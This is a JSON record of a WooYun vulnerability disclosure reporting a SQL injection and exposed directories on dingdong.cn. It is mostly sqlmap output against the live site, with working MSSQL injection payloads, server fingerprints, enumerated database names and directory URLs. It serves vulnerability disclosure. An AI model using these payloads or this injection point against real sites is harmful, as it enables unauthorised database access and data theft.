{"id": 55715, "wybug_id": "wooyun-2014-060134", "wybug_title": "叮咚无线一处sql注入(可跨库)+目录遍历", "wybug_corp": "叮咚无线", "wybug_author": "Mosuan", "wybug_date": "2014-05-10 10:02", "wybug_open_date": "2014-06-24 10:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["目录遍历", "数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-06-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 呵呵 详细说明：  叮咚无线是上海叮咚电子商务有限公司旗下的3G产品销售及服务平台，是国内最先提供3G业务办理及服务的电子商务网站之一，目前叮咚无线涉及业务范围包括家庭宽带、手机套餐以及智能电视。叮咚无线以创建“专业的家庭通信顾问”的品牌形象为导向，致力于为用户提供了真实丰富的产品信息、专业的导购建议与星级服务体验。叮咚无线具有十年以上的电信行业服务经验，拥有领先的行业优势和丰富的渠道资源，秉承“帮您选对、助您用好”的宗旨，以丰富的商品种类、最佳的业务组合、透明的商品信息和顾问式的售前售后服务，打造最值得用户信赖的3G业务办理及服务平台。你们的用户挺多的啊- -注入地址\nhttp://www.dingdong.cn/broadband/detail.aspx?id=599\n\n注入地址:http://www.dingdong.cn/broadband/detail.aspx?id=599    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 02:42:50[02:42:50] [INFO] using 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.dingdong.cn\\session' as session file[02:42:50] [INFO] testing connection to the target url[02:42:51] [INFO] testing if the url is stable, wait a few seconds[02:42:52] [INFO] url is stable[02:42:52] [INFO] testing if GET parameter 'id' is dynamic[02:42:52] [INFO] confirming that GET parameter 'id' is dynamic[02:42:52] [WARNING] GET parameter 'id' appears to be not dynamic[02:42:53] [WARNING] heuristic test shows that GET parameter 'id' might not be injectable[02:42:53] [INFO] testing sql injection on GET parameter 'id'[02:42:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[02:42:54] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable[02:42:54] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[02:42:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[02:42:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[02:42:54] [INFO] GET parameter 'id' is 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause' injectable[02:42:54] [INFO] testing 'MySQL > 5.0.11 stacked queries'[02:42:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[02:42:54] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[02:42:54] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[02:42:55] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[02:42:55] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[02:42:55] [INFO] testing 'Oracle AND time-based blind'[02:42:55] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[02:42:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 39 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=599 AND 5767=5767    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=599 AND 1450=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(110)+CHAR(122)+CHAR(58)+(SELECT (CASE WHEN (1450=1450) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(122)+CHAR(97)+CHAR(110)+CHAR(58)))---[02:43:11] [INFO] testing MySQL[02:43:11] [WARNING] the back-end DBMS is not MySQL[02:43:11] [INFO] testing Oracle[02:43:11] [WARNING] the back-end DBMS is not Oracle[02:43:11] [INFO] testing PostgreSQL[02:43:11] [WARNING] the back-end DBMS is not PostgreSQL[02:43:11] [INFO] testing Microsoft SQL Server[02:43:12] [INFO] confirming Microsoft SQL Server[02:43:12] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[02:43:12] [INFO] fetching database names[02:43:12] [INFO] the SQL query used returns 7 entries[02:43:16] [INFO] retrieved: 2012_dingdong[02:43:16] [INFO] retrieved: master[02:43:16] [INFO] retrieved: model[02:43:16] [INFO] retrieved: msdb[02:43:17] [INFO] retrieved: ReportServer[02:43:17] [INFO] retrieved: ReportServerTempDB[02:43:17] [INFO] retrieved: tempdbavailable databases [7]:[*] 2012_dingdong[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[02:43:17] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 56 times[02:43:17] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.dingdong.cn'\n各种目录遍历\nhttp://www.dingdong.cn/downloadhttp://www.dingdong.cn/config/http://www.dingdong.cn/aspnet_client\n   漏洞证明：  详细说明   修复方案：  过滤，限制目录访问   版权声明：转载请注明来源 Mosuan@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}